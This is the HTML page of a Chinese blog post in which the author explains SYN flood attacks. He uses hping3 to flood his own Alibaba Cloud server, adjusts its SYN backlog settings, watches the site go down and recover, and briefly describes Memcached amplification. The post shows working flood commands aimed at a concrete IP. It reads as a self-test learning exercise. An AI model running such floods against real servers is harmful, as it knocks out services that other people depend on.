@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="cn-zh">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+<meta itemprop="name" content="SYN Flood Attack">
+<meta itemprop="description" content="什么是SYN Flood SYN Flood，又称TCP Flood，是利用TCP协议三次握手消耗目标服务器资源的DDoS攻击。客户端通过伪造SYN包，使用伪造的源IP地址，因为服务端收到请求后会对SYN进行响应——发送SYN和ACK包，但是对方的地址是伪造的因此不会响应，服务端会重试几次后丢弃这个连接。这样会导致服务端对多个伪造的SYN包在重试响应，无暇理睬正常的连接请求。
+实践 初步尝试 根据定义，需要向特定服务发送大量的TCP SYN包，因此需要利用一些发包工具。通过搜索找到hping工具，作者是antirez（Redis作者）。以下是安装及文档中部分实践使用到的参数：
+uck@duck-MS-7A34:~$ sudo apt install hping3 duck@duck-MS-7A34:~$ sudo hping --help usage: hping3 host [options] -i --interval wait (uX for X microseconds, for example -i u1000) --fast alias for -i u10000 (10 packets for second) --faster alias for -i u1000 (100 packets for second) --flood sent packets as fast as possible. Don&#39;t show replies. IP -a --spoof spoof source address --rand-dest random destionation address mode.">
+<meta itemprop="datePublished" content="2019-12-26T14:03:53&#43;00:00" />
+<meta itemprop="dateModified" content="2019-12-26T14:03:53&#43;00:00" />
+<meta itemprop="wordCount" content="298">
+
+
+
+<meta itemprop="keywords" content="" /><meta property="og:title" content="SYN Flood Attack" />
+<meta property="og:description" content="什么是SYN Flood SYN Flood，又称TCP Flood，是利用TCP协议三次握手消耗目标服务器资源的DDoS攻击。客户端通过伪造SYN包，使用伪造的源IP地址，因为服务端收到请求后会对SYN进行响应——发送SYN和ACK包，但是对方的地址是伪造的因此不会响应，服务端会重试几次后丢弃这个连接。这样会导致服务端对多个伪造的SYN包在重试响应，无暇理睬正常的连接请求。
+实践 初步尝试 根据定义，需要向特定服务发送大量的TCP SYN包，因此需要利用一些发包工具。通过搜索找到hping工具，作者是antirez（Redis作者）。以下是安装及文档中部分实践使用到的参数：
+uck@duck-MS-7A34:~$ sudo apt install hping3 duck@duck-MS-7A34:~$ sudo hping --help usage: hping3 host [options] -i --interval wait (uX for X microseconds, for example -i u1000) --fast alias for -i u10000 (10 packets for second) --faster alias for -i u1000 (100 packets for second) --flood sent packets as fast as possible. Don&#39;t show replies. IP -a --spoof spoof source address --rand-dest random destionation address mode." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jiekun.dev/posts/2019-12-26-syn-flood-attack/" />
+<meta property="article:published_time" content="2019-12-26T14:03:53+00:00" />
+<meta property="article:modified_time" content="2019-12-26T14:03:53+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SYN Flood Attack"/>
+<meta name="twitter:description" content="什么是SYN Flood SYN Flood，又称TCP Flood，是利用TCP协议三次握手消耗目标服务器资源的DDoS攻击。客户端通过伪造SYN包，使用伪造的源IP地址，因为服务端收到请求后会对SYN进行响应——发送SYN和ACK包，但是对方的地址是伪造的因此不会响应，服务端会重试几次后丢弃这个连接。这样会导致服务端对多个伪造的SYN包在重试响应，无暇理睬正常的连接请求。
+实践 初步尝试 根据定义，需要向特定服务发送大量的TCP SYN包，因此需要利用一些发包工具。通过搜索找到hping工具，作者是antirez（Redis作者）。以下是安装及文档中部分实践使用到的参数：
+uck@duck-MS-7A34:~$ sudo apt install hping3 duck@duck-MS-7A34:~$ sudo hping --help usage: hping3 host [options] -i --interval wait (uX for X microseconds, for example -i u1000) --fast alias for -i u10000 (10 packets for second) --faster alias for -i u1000 (100 packets for second) --flood sent packets as fast as possible. Don&#39;t show replies. IP -a --spoof spoof source address --rand-dest random destionation address mode."/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>SYN Flood Attack</title>
+	<link rel="stylesheet" href="https://jiekun.dev/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css" integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://jiekun.dev">Jiekun&#39;s Blog</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://jiekun.dev/posts/">Posts</a>
+				<a href="https://jiekun.dev/about-me/">About</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://twitter.com/ReadTheDuck" target="_blank" rel="noopener me" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a><a href="https://github.com/2014bduck" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a><a href="mailto:2014bduck" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a></span><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://jiekun.dev/posts/">Posts</a></li>
+			<li><a href="https://jiekun.dev/about-me/">About</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner thin animated fadeIn faster">
+		<h1>SYN Flood Attack</h1>
+		<div class="content">
+			<h2 id="什么是syn-flood">什么是SYN Flood<a href="#什么是syn-flood" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>SYN Flood，又称TCP Flood，是利用TCP协议三次握手消耗目标服务器资源的DDoS攻击。客户端通过伪造SYN包，使用伪造的源IP地址，因为服务端收到请求后会对SYN进行响应——发送SYN和ACK包，但是对方的地址是伪造的因此不会响应，服务端会重试几次后丢弃这个连接。这样会导致服务端对多个伪造的SYN包在重试响应，无暇理睬正常的连接请求。</p>
+<h2 id="实践">实践<a href="#实践" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="初步尝试">初步尝试<a href="#初步尝试" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>根据定义，需要向特定服务发送大量的TCP SYN包，因此需要利用一些发包工具。通过搜索找到<a href="https://github.com/antirez/hping">hping工具</a>，作者是antirez（Redis作者）。以下是安装及文档中部分实践使用到的参数：</p>
+<pre><code>uck@duck-MS-7A34:~$ sudo apt install hping3
+duck@duck-MS-7A34:~$ sudo hping --help
+usage: hping3 host [options]
+  -i  --interval  wait (uX for X microseconds, for example -i u1000)
+      --fast      alias for -i u10000 (10 packets for second)
+      --faster    alias for -i u1000 (100 packets for second)
+      --flood      sent packets as fast as possible. Don't show replies.
+IP
+  -a  --spoof      spoof source address
+  --rand-dest      random destionation address mode. see the man.
+  --rand-source    random source address mode. see the man.
+UDP/TCP
+  -s  --baseport   base source port             (default random)
+  -p  --destport   [+][+]&amp;lt;port&gt; destination port(default 0) ctrl+z inc/dec
+  -S  --syn        set SYN flag&lt;/code&gt;&lt;/pre&gt;
+
+</code></pre><p>尝试攻击部署在阿里云的个人博客：</p>
+<pre><code>uck@duck-MS-7A34:~$ sudo hping3 -i u1000 -S -p 443 120.25.247.125
+HPING 120.25.247.125 (enp33s0 120.25.247.125): S set, 40 headers + 0 data bytes
+len=46 ip=120.25.247.125 ttl=49 DF id=0 sport=443 flags=SA seq=0 win=29200 rtt=15.8 ms
+len=46 ip=120.25.247.125 ttl=49 DF id=0 sport=443 flags=SA seq=1 win=29200 rtt=14.7 ms
+len=46 ip=120.25.247.125 ttl=49 DF id=0 sport=443 flags=SA seq=2 win=29200 rtt=13.6 ms
+len=46 ip=120.25.247.125 ttl=49 DF id=0 sport=443 flags=SA seq=3 win=29200 rtt=12.6 ms
+len=46 ip=120.25.247.125 ttl=49 DF id=0 sport=443 flags=SA seq=4 win=29200 rtt=11.5 ms
+len=46 ip=120.25.247.125 ttl=49 DF id=0 sport=443 flags=SA seq=5 win=29200 rtt=10.5 ms
+...&lt;/code&gt;&lt;/pre&gt;
+
+</code></pre><p>此时可以在ECS上看到网络情况，通过netstat命令查看到处于SYN_RECV的大量TCP连接，如图所示：</p>
+<p><img src="../2019/12/001-zhujiekun-SYN_RECV.png" alt=""></p>
+<h3 id="暴力发包">暴力发包<a href="#暴力发包" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>尝试将攻击频率调快：<code>sudo hping3 -i u1 -S -p 443 120.25.247.125</code>，然后在ECS上查看当前的SYN包个数：</p>
+<pre><code>uck@iZwz92ujq5zpxvm1vtq0gtZ:~$ netstat -n | grep SYN | wc -l
+128&lt;/code&gt;&lt;/pre&gt;
+
+</code></pre><p>只有128个TCP半连接，与发包数量相差很大。猜测是系统配置限制了总TCP连接数上限或者半连接状态连接数上限。</p>
+<p>通过查询相关文档，找到系统配置：</p>
+<pre><code>uck@iZwz92ujq5zpxvm1vtq0gtZ:~$ vim /etc/sysctl.conf
+vm.swappiness = 0
+net.ipv4.neigh.default.gc_stale_time = 120
+
+# see details in https://help.aliyun.com/knowledge_detail/39428.html
+net.ipv4.conf.all.rp_filter = 0
+net.ipv4.conf.default.rp_filter = 0
+net.ipv4.conf.default.arp_announce = 2
+net.ipv4.conf.lo.arp_announce = 2
+net.ipv4.conf.all.arp_announce = 2
+
+# see details in https://help.aliyun.com/knowledge_detail/41334.html
+net.ipv4.tcp_max_tw_buckets = 5000
+net.ipv4.tcp_syncookies = 1
+net.ipv4.tcp_max_syn_backlog = 128
+net.ipv4.tcp_synack_retries = 2
+
+net.ipv6.conf.all.disable_ipv6 = 1
+net.ipv6.conf.default.disable_ipv6 = 1
+net.ipv6.conf.lo.disable_ipv6 = 1
+net.ipv6.conf.eth0.disable_ipv6 =1
+
+kernel.sysrq = 1&lt;/code&gt;&lt;/pre&gt;
+
+</code></pre><p>其中一项<code>net.ipv4.tcp_max_syn_backlog = 128</code>可能是有关项，并且通过查阅文件中提供的阿里云文档，得到参数和它相关参数的具体描述：</p>
+<ul>
+<li><code>net.ipv4.tcp_max_syn_backlog</code>：该参数决定了系统中处于SYN_RECV状态的TCP连接数量。SYN_RECV状态指的是当系统收到SYN后，作为SYN+ACK响应后等待对方回复三次握手阶段中的最后一个ACK的阶段。对于还未获得对方确认的连接请求，可保存在队列中的最大数目。如果服务器经常出现过载，可以尝试增加这个数字。默认为1024。</li>
+<li><code>net.core.somaxconn</code>：该参数定义了系统中每一个端口最大的监听队列的长度，是个全局参数。该参数和net.ipv4.tcp_max_syn_backlog有关联，后者指的是还在三次握手的半连接的上限，该参数指的是处于ESTABLISHED的数量上限。当backlog大于net.core.somaxconn时，以net.core.somaxconn参数为准。</li>
+</ul>
+<p>那么将他们都改成一个特别大的数值然后保存，再尝试SYN Flood，结果如下：</p>
+<ul>
+<li>因为发包占用了很多的流量所以本机无法SSH上ECS查看</li>
+<li>通过阿里云的管理面板查看到TCP包一共64000个，其中NON_ESTABLISHED状态的包占了几乎全部数量</li>
+<li>访问https的博客地址无法响应</li>
+</ul>
+<p><img src="../2019/12/001-zhujiekun-TCP_connection_count.png" alt=""></p>
+<h3 id="持续监控">持续监控<a href="#持续监控" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>在持续发包一段时间后，发现TCP连接数下降至约500个，并且博客站点重新可以访问。因为时间原因没有尝试其他的手段，主要推测可能是现有的系统（也可能是协议层、云服务商等）对暴力SYN Flood攻击有判断和校验，丢弃特定特征的包（相同IP、端口或者其他指纹）。</p>
+<p>因为ECS地理位置离测试地点较近，所以通常延迟非常低。在SYN状态TCP连接数量从64k下降到500时，站点可以进行访问但是观察到速度比原来明显缓慢，通过这点猜测DoS攻击有生效但是受限于使用的发起攻击的设备流量条件不足以拖跨服务。</p>
+<h2 id="延伸思考">延伸思考<a href="#延伸思考" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>因为设备条件问题，虽然可以观察到大量半连接的TCP状态，但是离DoS（Denial of Service）还是有很大的差距，消耗不完目标的网络带宽或系统资源。那是否有方案通过小流量产生大流量（放大）的攻击呢？</p>
+<h3 id="memcached-ddos">Memcached DDoS<a href="#memcached-ddos" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>当Memcached服务器接收到GET请求，它从内存获取相关信息组织起一个RESPONSE，然后通过连续的UDP包进行返回。通常来说GET请求的体积和RESPONSE的体积大小可以相差很多倍。</p>
+<p>攻击者可以利用这点，先向Memcached服务器插入随机的大体积数据，然后向服务器请求。根据CloudFlare的报告，这样会导致一个巨大的流量放大倍数，例如15 byte的请求可以引起134KB的响应。当Memcached响应的对象指向攻击目标机器的时候，目标机器就会收到海量的UDP包，从而可能导致拒绝服务。</p>
+
+		</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2020 <a href="https://jiekun.dev">杰坤</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://jiekun.dev/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://jiekun.dev/js/bundle.min.4a9a0ac3d2217822c7865b4161e6c2a71de1d70492264337755427898dd718f6.js" integrity="sha256-SpoKw9IheCLHhltBYebCpx3h1wSSJkM3dVQniY3XGPY=" crossorigin="anonymous"></script>
+	
+
+</body>
+
+</html>
